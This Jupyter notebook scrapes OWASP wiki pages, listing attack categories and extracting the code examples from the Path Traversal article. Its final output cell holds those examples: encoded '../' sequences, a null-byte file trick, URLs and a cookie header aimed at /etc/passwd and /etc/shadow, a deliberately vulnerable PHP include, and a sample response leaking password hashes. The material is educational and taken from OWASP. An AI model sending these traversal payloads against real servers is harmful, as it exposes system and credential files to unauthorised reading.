{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import webbrowser\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver=webdriver.Chrome('/home/violeta/Downloads/BIG_DATA/chromedriver')\n",
    "##본인 드라이버 위치로 변경해야함"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver.implicitly_wait(3)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "category='Attack'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "url='https://www.owasp.org/index.php/Category:'+category"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver.get(url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "from bs4 import BeautifulSoup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [],
   "source": [
    "soup=BeautifulSoup(driver.page_source,'lxml')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [],
   "source": [
    "category_name=soup.select('.CategoryTreeLabel')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [],
   "source": [
    "category_list=list()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "for e in soup.select('.CategoryTreeLabel'):\n",
    "    category_list.append(e.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Abuse of Functionality',\n",
       " 'Automated Threat',\n",
       " 'Data Structure Attacks',\n",
       " 'Embedded Malicious Code',\n",
       " 'Exploitation of Authentication',\n",
       " 'Injection',\n",
       " 'Path Traversal Attack',\n",
       " 'Probabilistic Techniques',\n",
       " 'Protocol Manipulation',\n",
       " 'Resource Depletion',\n",
       " 'Resource Manipulation',\n",
       " 'Sniffing Attacks',\n",
       " 'Spoofing']"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "category_list"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [],
   "source": [
    "soupB=BeautifulSoup(driver.page_source,'html.parser')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [],
   "source": [
    "for e in soupB.select('div.mw-category-group a'):\n",
    "    category_list.append(e.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Abuse of Functionality',\n",
       " 'Automated Threat',\n",
       " 'Data Structure Attacks',\n",
       " 'Embedded Malicious Code',\n",
       " 'Exploitation of Authentication',\n",
       " 'Injection',\n",
       " 'Path Traversal Attack',\n",
       " 'Probabilistic Techniques',\n",
       " 'Protocol Manipulation',\n",
       " 'Resource Depletion',\n",
       " 'Resource Manipulation',\n",
       " 'Sniffing Attacks',\n",
       " 'Spoofing',\n",
       " 'Abuse of Functionality',\n",
       " 'Automated Threat',\n",
       " 'Data Structure Attacks',\n",
       " 'Embedded Malicious Code',\n",
       " 'Exploitation of Authentication',\n",
       " 'Injection',\n",
       " 'Path Traversal Attack',\n",
       " 'Probabilistic Techniques',\n",
       " 'Protocol Manipulation',\n",
       " 'Resource Depletion',\n",
       " 'Resource Manipulation',\n",
       " 'Sniffing Attacks',\n",
       " 'Spoofing',\n",
       " 'Binary planting',\n",
       " 'Blind SQL Injection',\n",
       " 'Blind XPath Injection',\n",
       " 'Brute force attack',\n",
       " 'Buffer overflow attack',\n",
       " 'Cache Poisoning',\n",
       " 'Cash Overflow',\n",
       " 'Code Injection',\n",
       " 'Command Injection',\n",
       " 'Comment Injection Attack',\n",
       " 'Content Security Policy',\n",
       " 'Content Spoofing',\n",
       " 'Cornucopia - Ecommerce Website Edition - Wiki Deck',\n",
       " 'CORS OriginHeaderScrutiny',\n",
       " 'CORS RequestPreflighScrutiny',\n",
       " 'Credential stuffing',\n",
       " 'Cross Frame Scripting',\n",
       " 'Cross Site History Manipulation (XSHM)',\n",
       " 'Cross Site Tracing',\n",
       " 'Cross-Site Request Forgery (CSRF)',\n",
       " 'Cross-site Scripting (XSS)',\n",
       " 'Cross-User Defacement',\n",
       " 'Cryptanalysis',\n",
       " 'CSV Injection',\n",
       " 'Custom Special Character Injection',\n",
       " 'Denial of Service',\n",
       " \"Direct Dynamic Code Evaluation ('Eval Injection')\",\n",
       " 'Execution After Redirect (EAR)',\n",
       " 'Forced browsing',\n",
       " 'Form action hijacking',\n",
       " 'Format string attack',\n",
       " 'Full Path Disclosure',\n",
       " 'Function Injection',\n",
       " 'HTTP Response Splitting',\n",
       " 'Inyección de Código',\n",
       " 'Inyección SQL',\n",
       " 'Inyección SQL Ciega',\n",
       " 'Inyección XPath',\n",
       " 'Inyección XPath Ciega',\n",
       " 'Log Injection',\n",
       " 'Man-in-the-browser attack',\n",
       " 'Man-in-the-middle attack',\n",
       " 'Mobile code: invoking untrusted mobile code',\n",
       " 'Mobile code: non-final public field',\n",
       " 'Mobile code: object hijack',\n",
       " 'One-Click Attack',\n",
       " 'OWASP Cornucopia',\n",
       " 'Parameter Delimiter',\n",
       " 'Path Traversal',\n",
       " 'Reflected DOM Injection',\n",
       " 'Regular expression Denial of Service - ReDoS',\n",
       " 'Repudiation Attack',\n",
       " 'Resource Injection',\n",
       " 'Reverse Tabnabbing',\n",
       " 'Server-Side Includes (SSI) Injection',\n",
       " 'Session fixation',\n",
       " 'Session hijacking attack',\n",
       " 'Session Prediction',\n",
       " 'Setting Manipulation',\n",
       " 'Special Element Injection',\n",
       " 'Spyware',\n",
       " 'SQL Injection',\n",
       " 'Traffic flood',\n",
       " 'Trojan Horse',\n",
       " 'Unicode Encoding',\n",
       " 'Web Parameter Tampering',\n",
       " 'Windows ::DATA alternate data stream',\n",
       " 'XPATH Injection',\n",
       " 'XSRF',\n",
       " 'Xss in subtitle']"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "category_list"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [],
   "source": [
    "newUrl=list(map(lambda i:'https://www.owasp.org/index.php/Category:'+i,category_list))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "('https://www.owasp.org/index.php/Category:Abuse of Functionality',\n",
       " 'https://www.owasp.org/index.php/Category:Automated Threat',\n",
       " 'https://www.owasp.org/index.php/Category:Data Structure Attacks',\n",
       " 'https://www.owasp.org/index.php/Category:Embedded Malicious Code',\n",
       " 'https://www.owasp.org/index.php/Category:Exploitation of Authentication',\n",
       " 'https://www.owasp.org/index.php/Category:Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Path Traversal Attack',\n",
       " 'https://www.owasp.org/index.php/Category:Probabilistic Techniques',\n",
       " 'https://www.owasp.org/index.php/Category:Protocol Manipulation',\n",
       " 'https://www.owasp.org/index.php/Category:Resource Depletion',\n",
       " 'https://www.owasp.org/index.php/Category:Resource Manipulation',\n",
       " 'https://www.owasp.org/index.php/Category:Sniffing Attacks',\n",
       " 'https://www.owasp.org/index.php/Category:Spoofing',\n",
       " 'https://www.owasp.org/index.php/Category:Abuse of Functionality',\n",
       " 'https://www.owasp.org/index.php/Category:Automated Threat',\n",
       " 'https://www.owasp.org/index.php/Category:Data Structure Attacks',\n",
       " 'https://www.owasp.org/index.php/Category:Embedded Malicious Code',\n",
       " 'https://www.owasp.org/index.php/Category:Exploitation of Authentication',\n",
       " 'https://www.owasp.org/index.php/Category:Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Path Traversal Attack',\n",
       " 'https://www.owasp.org/index.php/Category:Probabilistic Techniques',\n",
       " 'https://www.owasp.org/index.php/Category:Protocol Manipulation',\n",
       " 'https://www.owasp.org/index.php/Category:Resource Depletion',\n",
       " 'https://www.owasp.org/index.php/Category:Resource Manipulation',\n",
       " 'https://www.owasp.org/index.php/Category:Sniffing Attacks',\n",
       " 'https://www.owasp.org/index.php/Category:Spoofing',\n",
       " 'https://www.owasp.org/index.php/Category:Binary planting',\n",
       " 'https://www.owasp.org/index.php/Category:Blind SQL Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Blind XPath Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Brute force attack',\n",
       " 'https://www.owasp.org/index.php/Category:Buffer overflow attack',\n",
       " 'https://www.owasp.org/index.php/Category:Cache Poisoning',\n",
       " 'https://www.owasp.org/index.php/Category:Cash Overflow',\n",
       " 'https://www.owasp.org/index.php/Category:Code Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Command Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Comment Injection Attack',\n",
       " 'https://www.owasp.org/index.php/Category:Content Security Policy',\n",
       " 'https://www.owasp.org/index.php/Category:Content Spoofing',\n",
       " 'https://www.owasp.org/index.php/Category:Cornucopia - Ecommerce Website Edition - Wiki Deck',\n",
       " 'https://www.owasp.org/index.php/Category:CORS OriginHeaderScrutiny',\n",
       " 'https://www.owasp.org/index.php/Category:CORS RequestPreflighScrutiny',\n",
       " 'https://www.owasp.org/index.php/Category:Credential stuffing',\n",
       " 'https://www.owasp.org/index.php/Category:Cross Frame Scripting',\n",
       " 'https://www.owasp.org/index.php/Category:Cross Site History Manipulation (XSHM)',\n",
       " 'https://www.owasp.org/index.php/Category:Cross Site Tracing',\n",
       " 'https://www.owasp.org/index.php/Category:Cross-Site Request Forgery (CSRF)',\n",
       " 'https://www.owasp.org/index.php/Category:Cross-site Scripting (XSS)',\n",
       " 'https://www.owasp.org/index.php/Category:Cross-User Defacement',\n",
       " 'https://www.owasp.org/index.php/Category:Cryptanalysis',\n",
       " 'https://www.owasp.org/index.php/Category:CSV Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Custom Special Character Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Denial of Service',\n",
       " \"https://www.owasp.org/index.php/Category:Direct Dynamic Code Evaluation ('Eval Injection')\",\n",
       " 'https://www.owasp.org/index.php/Category:Execution After Redirect (EAR)',\n",
       " 'https://www.owasp.org/index.php/Category:Forced browsing',\n",
       " 'https://www.owasp.org/index.php/Category:Form action hijacking',\n",
       " 'https://www.owasp.org/index.php/Category:Format string attack',\n",
       " 'https://www.owasp.org/index.php/Category:Full Path Disclosure',\n",
       " 'https://www.owasp.org/index.php/Category:Function Injection',\n",
       " 'https://www.owasp.org/index.php/Category:HTTP Response Splitting',\n",
       " 'https://www.owasp.org/index.php/Category:Inyección de Código',\n",
       " 'https://www.owasp.org/index.php/Category:Inyección SQL',\n",
       " 'https://www.owasp.org/index.php/Category:Inyección SQL Ciega',\n",
       " 'https://www.owasp.org/index.php/Category:Inyección XPath',\n",
       " 'https://www.owasp.org/index.php/Category:Inyección XPath Ciega',\n",
       " 'https://www.owasp.org/index.php/Category:Log Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Man-in-the-browser attack',\n",
       " 'https://www.owasp.org/index.php/Category:Man-in-the-middle attack',\n",
       " 'https://www.owasp.org/index.php/Category:Mobile code: invoking untrusted mobile code',\n",
       " 'https://www.owasp.org/index.php/Category:Mobile code: non-final public field',\n",
       " 'https://www.owasp.org/index.php/Category:Mobile code: object hijack',\n",
       " 'https://www.owasp.org/index.php/Category:One-Click Attack',\n",
       " 'https://www.owasp.org/index.php/Category:OWASP Cornucopia',\n",
       " 'https://www.owasp.org/index.php/Category:Parameter Delimiter',\n",
       " 'https://www.owasp.org/index.php/Category:Path Traversal',\n",
       " 'https://www.owasp.org/index.php/Category:Reflected DOM Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Regular expression Denial of Service - ReDoS',\n",
       " 'https://www.owasp.org/index.php/Category:Repudiation Attack',\n",
       " 'https://www.owasp.org/index.php/Category:Resource Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Reverse Tabnabbing',\n",
       " 'https://www.owasp.org/index.php/Category:Server-Side Includes (SSI) Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Session fixation',\n",
       " 'https://www.owasp.org/index.php/Category:Session hijacking attack',\n",
       " 'https://www.owasp.org/index.php/Category:Session Prediction',\n",
       " 'https://www.owasp.org/index.php/Category:Setting Manipulation',\n",
       " 'https://www.owasp.org/index.php/Category:Special Element Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Spyware',\n",
       " 'https://www.owasp.org/index.php/Category:SQL Injection',\n",
       " 'https://www.owasp.org/index.php/Category:Traffic flood',\n",
       " 'https://www.owasp.org/index.php/Category:Trojan Horse',\n",
       " 'https://www.owasp.org/index.php/Category:Unicode Encoding',\n",
       " 'https://www.owasp.org/index.php/Category:Web Parameter Tampering',\n",
       " 'https://www.owasp.org/index.php/Category:Windows ::DATA alternate data stream',\n",
       " 'https://www.owasp.org/index.php/Category:XPATH Injection',\n",
       " 'https://www.owasp.org/index.php/Category:XSRF',\n",
       " 'https://www.owasp.org/index.php/Category:Xss in subtitle')"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "tuple(newUrl)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [],
   "source": [
    "dic=dict()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver.get('https://www.owasp.org/index.php/Path_Traversal')\n",
    "soupC=BeautifulSoup(driver.page_source,'html.parser')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {},
   "outputs": [],
   "source": [
    "newnew=list()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "for e in soupC.select('div.mw-content-ltr pre'):\n",
    "    newnew.append(e.text.replace('\\n',''))\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['%2e%2e%2f represents ../%2e%2e/ represents ../..%2f represents ../ %2e%2e%5c represents ..\\\\%2e%2e\\\\ represents ..\\\\ ..%5c represents ..\\\\ %252e%252e%255c represents ..\\\\ ..%255c represents ..\\\\ and so on. ',\n",
       " '..%c0%af represents ../ ..%c1%9c represents ..\\\\ ',\n",
       " 'Root directory:  “ / “ Directory separator: “ / “',\n",
       " 'Root directory: “  <partition letter>\\xa0: \\\\ “Directory separator: “ / “ or “ \\\\ ” Note that windows allows filenames to be followed by extra . \\\\ / characters.',\n",
       " '?file=secret.doc%00.pdf',\n",
       " ' http://some_site.com.br/get-files.jsp?file=report.pdf   http://some_site.com.br/get-page.php?home=aaa.html   http://some_site.com.br/some-page.asp?page=index.html  ',\n",
       " '  http://some_site.com.br/get-files?file=../../../../some dir/some file ',\n",
       " '  http://some_site.com.br/../../../../some dir/some file ',\n",
       " 'http://some_site.com.br/../../../../etc/shadow  http://some_site.com.br/get-files?file=/etc/passwd ',\n",
       " ' http://some_site.com.br/some-page?page=http://other-site.com.br/other-page.htm/malicius-code.php   ',\n",
       " ' http://vulnerable-page.org/cgi-bin/main.cgi?file=main.cgi   ',\n",
       " '<?php$template = \\'blue.php\\';if ( is_set( $_COOKIE[\\'TEMPLATE\\'] ) )   $template = $_COOKIE[\\'TEMPLATE\\'];include ( \"/home/users/phpguru/templates/\" . $template );?>',\n",
       " 'GET /vulnerable.php HTTP/1.0Cookie: TEMPLATE=../../../../../../../../../etc/passwd',\n",
       " 'HTTP/1.0 200 OKContent-Type: text/htmlServer: Apacheroot:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh daemon:*:1:1::/tmp: phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh',\n",
       " 'http://testsite.com/get.php?f=listhttp://testsite.com/get.cgi?f=2http://testsite.com/get.asp?f=test',\n",
       " 'http://testsite.com/get.php?f=/var/www/html/get.phphttp://testsite.com/get.cgi?f=/var/www/html/admin/get.inchttp://testsite.com/get.asp?f=/etc/passwd']"
      ]
     },
     "execution_count": 118,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.15"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
